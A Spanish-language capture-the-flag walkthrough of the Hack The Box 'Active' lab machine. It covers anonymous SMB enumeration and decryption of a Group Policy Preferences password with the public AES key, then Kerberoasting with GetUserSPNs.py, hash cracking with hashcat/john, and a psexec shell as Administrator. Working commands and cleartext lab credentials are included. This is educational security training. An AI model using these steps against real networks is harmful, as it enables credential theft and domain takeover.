# Active

![](../../../../~gitbook/image.md)Publicado: 20 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
Técnicas: GPP Password Decryption, Kerberoasting, SMB Enumeration
### 📝 Descripción
Active es una máquina Windows de dificultad Easy que simula un entorno de Active Directory real. La explotación se centra en la enumeración de recursos SMB accesibles sin autenticación, donde encontramos archivos de Group Policy Preferences (GPP) que contienen credenciales cifradas con una clave conocida públicamente.Una vez obtenidas las credenciales del usuario de servicio `SVC_TGS`, aprovechamos que este usuario está configurado con un SPN (Service Principal Name) para realizar un ataque de Kerberoasting, obteniendo el hash TGS del usuario Administrator y crackeándolo offline para conseguir acceso completo al dominio.Esta máquina es perfecta para practicar técnicas fundamentales de enumeración en entornos Active Directory y entender las vulnerabilidades asociadas a configuraciones incorrectas de Group Policy Preferences.
### 🎯 Puntos Clave
- 🔍 Enumeración SMB sin credenciales
- 🔐 Explotación de Group Policy Preferences (GPP)
- 🎫 Kerberoasting Attack
- 📊 Enumeración de Active Directory
- 🛡️ Escalada de privilegios en entornos Windows

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
#### 📋 Análisis de Servicios Detectados
PuertoServicioDescripción53DNSMicrosoft DNS Server88KerberosAutenticación de dominio389/636LDAP/LDAPSDirectorio Active Directory445SMBRecursos compartidos464KpasswdCambio de contraseñas Kerberos
### 🌐 Enumeración de Servicios

#### 🗂️ 445 SMB
Ya que no disponemos de credenciales, comenzamos tratando de enumerar recursos con una null session:![](../../../../~gitbook/image.md)🎉 Encontramos que el recurso `Replication` es accesible con permisos de lectura sin autenticación.
#### 📁 Descarga del contenido de Replication
![](../../../../~gitbook/image.md)
#### 🔍 Análisis de Group Policy Preferences
En el directorio `/Active/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/` encontramos un archivo Groups.xml que contiene credenciales cifradas:
### 🔐 Explotación de GPP (Group Policy Preferences)

#### 🧠 ¿Qué es GPP y por qué es vulnerable?
Group Policy Preferences fue introducido en Windows Server 2008 para permitir a los administradores configurar ajustes que no estaban disponibles en las configuraciones tradicionales de Group Policy.El problema: Microsoft utilizó una clave AES estática y públicamente conocida para cifrar las contraseñas en los archivos XML de GPP.
#### 🔓 Descifrando la contraseña
🧰 Método 1: gpp-decrypt (Recomendado)🧰 Método 2: Script Python personalizado
#### 🎯 Credenciales Obtenidas

### 🔑 Acceso Inicial

#### 📊 Validación de credenciales
![](../../../../~gitbook/image.md)✅ ¡Credenciales válidas! Ahora tenemos acceso al recurso `Users`.
#### 🏁 Obteniendo la User Flag
🎉 User Flag obtenida!
### 🎫 Escalada de Privilegios - Kerberoasting

#### 🔍 ¿Qué es Kerberoasting?
Kerberoasting es una técnica que aprovecha cuentas de servicio configuradas con SPNs (Service Principal Names) para extraer hashes TGS que pueden ser crackeados offline.Enumeramos usuarios y formateamos la salida para volcarlos a un fichero de texto:![](../../../../~gitbook/image.md)
#### 🎯 Enumeración de usuarios con SPN

#### 💎 Extracción del hash TGS

#### 🔨 Cracking del hash
Una vez obtenido el hash del TGS del usuario Administrator podemos intentar crackearlo offline usando John/Hashcat con el dicccionario rockyou.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🏆 Credenciales de Administrator

### 👑 Acceso como Administrator

#### 🚀 Conexión con privilegios administrativos
![](../../../../~gitbook/image.md)
#### 🏁 Root Flag
🎉 Root Flag obtenida!Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🔐 Explotación de GPP (Group Policy Preferences)](#explotacion-de-gpp-group-policy-preferences)
- [🔑 Acceso Inicial](#acceso-inicial)
- [🎫 Escalada de Privilegios - Kerberoasting](#escalada-de-privilegios-kerberoasting)
- [👑 Acceso como Administrator](#acceso-como-administrator)

```
❯ ping -c2 10.10.10.100
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=78.6 ms
64 bytes from 10.10.10.100: icmp_seq=2 ttl=127 time=52.5 ms

--- 10.10.10.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 52.500/65.526/78.552/13.026 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.100 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49171,49173
```

```
nmap -sC -sV -p$ports 10.10.10.100 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 19:23 CEST
Nmap scan report for 10.10.10.100
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-19 17:23:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-19T17:24:41
|_  start_date: 2025-06-19T16:31:35
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
```

```
echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts
```

```
smbmap -H 10.10.10.100 -u '' -p '' -r

________  ___      ___  _______   ___      ___       __         _______
/"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
(:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
\___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
__/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
/" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
(_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
ADMIN$                                            	NO ACCESS	Remote Admin
C$                                                	NO ACCESS	Default share
IPC$                                              	NO ACCESS	Remote IPC
NETLOGON                                          	NO ACCESS	Logon server share
Replication                                       	READ ONLY
./Replication
dr--r--r--                0 Sat Jul 21 12:37:44 2018	.
dr--r--r--                0 Sat Jul 21 12:37:44 2018	..
dr--r--r--                0 Sat Jul 21 12:37:44 2018	active.htb
SYSVOL                                            	NO ACCESS	Logon server share
Users                                             	NO ACCESS
[*] Closed 1 connections
```

```
smbclient //10.10.10.100/Replication -N -c "cd active.htb; recurse ON; prompt OFF; mget *"
```

```

```

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
from Crypto.Cipher import AES
import base64

# Clave estática de Microsoft (públicamente conocida)
key = bytes.fromhex('4e9906e8fcb6b6bbb77c34fef5e4584d')

# cpassword extraído del XML
cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
decoded = base64.b64decode(cpassword)

cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 16)
plaintext = cipher.decrypt(decoded)

# Limpieza del padding
print(plaintext.rstrip(b"\x00").decode())
```

```
Usuario: SVC_TGS
Contraseña: GPPstillStandingStrong2k18
```

```
netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

```
smbclient -U 'SVC_TGS' \\\\10.10.10.100\\Users
Password for [WORKGROUP\SVC_TGS]: GPPstillStandingStrong2k18

smb: \> cd SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec)
```

```
netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
# Enumeración de usuarios del dominio
netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --users

# Búsqueda específica de usuarios con SPN
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

```
# Solicitar ticket TGS para el usuario Administrator
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -outputfile hashes.txt

# Ejemplo de hash obtenido:
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$[HASH_CONTENT]
```

```
# Usando hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Usando John the Ripper
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
Usuario: Administrator
Contraseña: Ticketmaster1968
```

```
# Validar credenciales de Administrator
netexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'

# Obtener shell como Administrator
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

```
# Navegar al directorio del Administrator
cd C:\Users\Administrator\Desktop\

# Obtener la flag de root
type root.txt
```
